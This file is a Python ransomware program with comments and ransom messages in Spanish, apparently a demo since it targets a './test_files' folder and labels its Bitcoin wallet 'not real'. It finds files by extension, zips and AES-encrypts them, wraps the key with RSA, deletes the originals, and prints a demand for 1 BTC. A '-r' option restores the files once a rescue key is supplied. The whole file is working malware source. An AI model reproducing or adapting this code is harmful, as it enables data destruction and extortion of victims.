#!/usr/bin/env python

import os, sys, random, struct, zipfile
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

# Files:
# ~/.ransom
	# data.zip (temp)
	# data.enc
	# .key (encrypted AES key using RSA public key)
	# .clear_key (rescue key)
wd = ['./test_files'] 
extensions = ["txt", "c", "rb", "cpp", "jpg"]
btc_wallet = "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy" # not real

def find_files(wd):
	files=[]
	for dirname, dirnames, filenames in os.walk(wd):
		for filename in filenames:
			if filename.split('.')[-1] in extensions:
			    files.append(os.path.join(dirname, filename))
	return files


def zip_files(files):
	zipname=os.path.expanduser("~/.ransom/data.zip")
	with zipfile.ZipFile(zipname, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
		for path in files:
			zf.write(path)


def remove_files(files):
	for path in files:
		os.remove(path)	


def encrypt_symmetric_key(key):
	file_out = open(os.path.expanduser("~/.ransom/.key"), "wb")
	recipient_key = RSA.importKey(open("key").read())
	cipher_rsa = PKCS1_OAEP.new(recipient_key)
	file_out.write(cipher_rsa.encrypt(key))


def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))


def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)
        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(origsize)


def ransom_data():
	if not os.path.isdir(os.path.expanduser("~/.ransom/")):
		os.mkdir(os.path.expanduser("~/.ransom/"))
	files = []
	for swd in wd:
		files += find_files(swd)
	zip_files(files)
	key = get_random_bytes(32)
	encrypt_file(key, os.path.expanduser("~/.ransom/data.zip"), out_filename=os.path.expanduser("~/.ransom/data.enc"))
	encrypt_symmetric_key(key)
	remove_files(files)
	os.remove(os.path.expanduser("~/.ransom/data.zip"))
	print("Si quiere recuperar sus archivos deposite 1 btc en la siguiente dirección:")
	print(btc_wallet)
	print("Se le enviara la clave de descifrado, una vez confirmado el pago.")


def rescue_data():
	key=None
	try:
		key = open(os.path.expanduser("~/.ransom/.clear_key"), 'rb').read()
	except:
		print("[-] Paga para obtener la clave y recuperar tus archivos.\n[-] Deposita la clave .clear_key en el directorio ~/.ransom/")
		exit(1)
	decrypt_file(key, os.path.expanduser("~/.ransom/data.enc"), out_filename=os.path.expanduser("~/.ransom/data.zip"))
	zip_ref = zipfile.ZipFile(os.path.expanduser("~/.ransom/data.zip"), 'r')
	zip_ref.extractall(os.path.expanduser("~/.ransom/"))
	zip_ref.close()
	os.remove(os.path.expanduser("~/.ransom/data.zip"))
	os.remove(os.path.expanduser("~/.ransom/data.enc"))
	os.remove(os.path.expanduser("~/.ransom/.key"))
	os.remove(os.path.expanduser("~/.ransom/.clear_key"))

if __name__ == "__main__":
	if len(sys.argv) > 1:
		if sys.argv[1] == "-r":
			rescue_data()
	else:
		ransom_data()